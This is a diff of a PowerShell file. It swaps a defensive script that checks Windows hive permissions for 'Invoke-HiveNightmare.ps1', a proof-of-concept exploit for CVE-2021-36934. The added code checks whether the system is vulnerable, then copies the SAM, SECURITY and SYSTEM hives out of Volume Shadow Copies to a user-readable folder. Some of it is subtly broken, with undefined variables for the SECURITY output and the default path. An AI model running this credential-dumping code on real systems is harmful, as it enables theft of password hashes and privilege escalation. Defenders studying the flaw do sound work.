@@ -1,112 +1,99 @@
-###Meta###
-	# Date: 2021 July 20th
-	# Authors: Tom Ellson & Dray Agha
-	# Find us on Twitter: https://twitter.com/tde_sec and https://twitter.com/Purp1eW0lf
-	# Org: JUMPSEC Labs
-	# Contact: for more information, contact tellson@jumpsec.com or dray.agha@jumpsec.com
+<#
+    .SYNOPSIS
+        PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, Security, and security Registry hives in Windows 10 version 1809 or newer. 
 
-	# Purpose: This script was written in response to the discovery that the SAM file had a permissions error that allows any user to read it's contents. This facilitates privilege escalation and as such, we quickly put this script together to help the community quickly determine how widespread their internal attack surface was for this.
+        The vulnerability was discovered by @jonasLyk.
 
-#Ensure errors don't ruin anything for us
-$ErrorActionPreference = "SilentlyContinue"
+    .PARAMETER path
+        Used to supply the path to dump the Registry hives. If the parameter isn't used, the path will be default to the user's desktop.
 
-#Print basic script info
-Write-host "`nThis script will collect OS info and determine if the SAM file can be read by any user due to permissions error`n"
-write-host -foregroundcolor Magenta "`nRunning Script.......`n"
+    .EXAMPLE
+        PS C:\> .\Invoke-HiveNightmare.ps1 -path "c:\"
+        
+        Dumps the hives from the system's Volume Shadow Copies to C:\.
+        
+    .EXAMPLE
+        PS C:\> .\Invoke-HiveNightmare.ps1 
 
-###collect computer information###
-	# Funnily enough, this takes the longest 
+        Dumps the hives from the system's Volume Shadow Copies to C:\users\[USERNAME]\desktop.
+
+    .NOTES  
+        Modified_By    : @BlackSnufkin
+	Created        : 26 Aug 21
 	
-#Variables for OS version
-$Name = ([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname
-$OS = gin | select -expandproperty OsName
-$Ver = gin | select -expandproperty WindowsVersion
-$Build= gin | select -expandproperty OSBuildNumber
+	File Name      : Invoke-HiveNightmare.ps1
+        Version        : v.0.2
+        Author         : @WiredPulse
+        Created        : 21 Jul 21
+	
+#>
 
-#demarcate OS Info section
-Write-host "`n---OS Info---"
+[CmdletBinding()]
+param(
+       $path = "C:\Users\$username\Desktop"
+)
 
-#print variables for OS version. Stupid formatting here to get the colours because I am extra
-Write-host -foregroundcolor Magenta "`n$Name " -NoNewline
-write-host "is running " -NoNewline 
-write-host -foregroundcolor Magenta "$OS " -NoNewline
-write-host "version number " -NoNewline
-write-host -foregroundcolor Magenta "$Ver " -NoNewline
-write-host "and build number "  -NoNewline
-write-host -foregroundcolor Magenta "$Build`n"
+$ErrorActionPreference = "SilentlyContinue"
+$outSam = "$path\Sam.hive"
+$outSec = "$path\Sec.hive"
+$outSys = "$path\Sys.hive"
 
-###Determine if SAM is vulnerable###
+if(-not(test-path $path)){
+    new-item $path -ItemType Directory | out-null
+}
 
-#demarcate results section
-write-host "`n---Vulnerability Results---"
+if(([environment]::OSVersion.Version).build -lt 17763){
+    Write-Host -ForegroundColor red "[-] System not susceptible to CVE-2021-36934"
 
-if ((get-acl C:\windows\system32\config\sam).Access |
-	? IdentityReference -match 'BUILTIN\\Users' | 
-	select -expandproperty filesystemrights | 
-	select-string 'Read')
-	{
-		write-host -foregroundcolor Red "`n[!] $Name may be vulnerable: Arbitrary Read permissions for SAM file`n"
-		$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM"
-				if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"} 
-				else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SAM"
-					if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-					else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM"
-					    if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-					    else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SAM"
-                            if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-                            else {Write-host -foregroundcolor Yellow "[-] No ShadowCopy of SAM file to read from"}
+}
+else{
+    Write-Host -ForegroundColor yellow "[!] " -NoNewline; Write-Host -ForegroundColor green "System is a vulnerable version of Windows"
+}
+
+$running = (Get-Service vss).Status
+    if ($running) {
+        Write-Host -ForegroundColor yellow "[!] " -NoNewline;Write-Host -ForegroundColor green "ShadowCopy service is running, system may be vulnerable"
+         $vss_running=$True
+    } else {
+        Write-Host "[*] ShadowCopy service is not running, however snapshots may still be available" -ForegroundColor Yellow
         
-                        }
-					}
-				} 
-		
-	}
-else {
-	write-host  -foregroundcolor Green "`n[+] $Name does not seem to be vulnerable, SAM permissions are fine`n"}
+                
+    }
 
-if ((get-acl C:\windows\system32\config\system).Access |
-	? IdentityReference -match 'BUILTIN\\Users' | 
-	select -expandproperty filesystemrights | 
-	select-string 'Read')
-	{
-		write-host -foregroundcolor Red "`n$Name may be vulnerable: Arbitrary Read permissions for SYSTEM file`n"
-		$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM"
-				if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"} 
-				else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SYSTEM"
-					if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-					else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SYSTEM"
-					    if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-					    else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SYSTEM"
-                            if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-                            else {Write-host -foregroundcolor Yellow "[-] No ShadowCopy of SAM file to read from"}
-        
-                        }
-					}	
-				}	 
-	}
-else {
-	write-host  -foregroundcolor Green "`n[+] $Name does not seem to be vulnerable, SYSTEM permissions are fine`n"}
- 
-if ((get-acl C:\windows\system32\config\security).Access |
-	? IdentityReference -match 'BUILTIN\\Users' | 
-	select -expandproperty filesystemrights | 
-	select-string 'Read')
-	{
-		write-host -foregroundcolor Red "`n[!] $Name may be vulnerable: Arbitrary Read permissions for SECURITY file`n"
-		$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY"
-				if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"} 
-				else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SECURITY"
-					if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-					else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SECURITY"
-					    if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-					    else {$shadowpath=Test-Path -Path "Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SECURITY"
-                            if ($shadowpath -eq $true){write-host -foregroundcolor Green "you Have EOP you can copy this File $shadowpath"}
-                            else {Write-host -foregroundcolor Yellow "[-] No ShadowCopy of SECURITY file to read from"}
-        
-                        }
-				}
-			} 
-	}
-else {
-	write-host  -foregroundcolor Green "`n[+] $Name does not seem to be vulnerable, SECURITY permissions are fine`n"}
 
+if (( Get-Acl C:\windows\system32\config\sam).Access | ? IdentityReference -match 'BUILTIN\\Users' | Select-Object -expandproperty filesystemrights | Select-String 'Read') { 
+        Write-Host -ForegroundColor yellow "[!] " -NoNewline;Write-Host "Detected improper SAM hive permissions - System may be vulnerable" -ForegroundColor Green
+        $sam_vulnerable = $True
+         
+    } else { 
+        Write-Host -ForegroundColor yellow  "[-] "-NoNewline;Write-Host "SAM Permissions Are set correctly" -ForegroundColor Red}
+       
+        
+ if($sam_vulnerable -and $vss_running -eq $True) {
+    Write-Host -ForegroundColor yellow "[+] "-NoNewline;Write-Host "All conditions exist for exploit of CVE-2021-36934" -ForegroundColor green}
+ else { Write-Host -ForegroundColor yellow  "[-] "-NoNewline;Write-Host "All Hive File Permissions Are set correctly"  -ForegroundColor Red;Write-Host -ForegroundColor yellow "[-] " -NoNewline;Write-Host -ForegroundColor Red "Bye Bye....";break}
+
+
+
+for($i = 1; $i -le 9; $i++){
+    try{
+        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\sam"), ($outSam + $i))
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
+    } catch{}
+    try{
+        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\security"), ($outSoft + $i))
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SECURITY$i hive..."
+    }
+    catch{}
+    try{
+        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\system"), ($outSys + $i))
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SYSTEM$i hive..."
+    }
+    catch{}
+}
+if(test-path $path\s*.hive*){
+    Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Hives are dumped to $path"
+}
+else{
+    Write-Host -ForegroundColor red "[-] There are no Volume Shadow Copies on this system"
+}
